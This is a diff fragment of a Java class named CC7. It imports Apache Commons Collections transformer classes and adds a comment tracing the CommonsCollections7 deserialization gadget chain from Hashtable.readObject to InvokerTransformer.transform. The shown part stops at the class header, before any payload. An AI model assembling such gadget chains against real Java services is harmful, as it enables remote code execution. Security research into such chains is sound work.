@@ -5,13 +5,21 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
-import sun.reflect.Reflection;
 
 import java.io.*;
 import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Hashtable;
 import java.util.Map;
+
+/*
+* Hashtable.readObject()
+*  ->Hashtable.reconstitutionPut()
+*   ->AbstractMap.equals()
+*    ->LazyMap.get()
+*     ->ChainedTransformer.transform()
+*      ->InvokerTransformer.transform()
+* */
 
 public class CC7 {
     public static void main(String[] args) throws Exception {
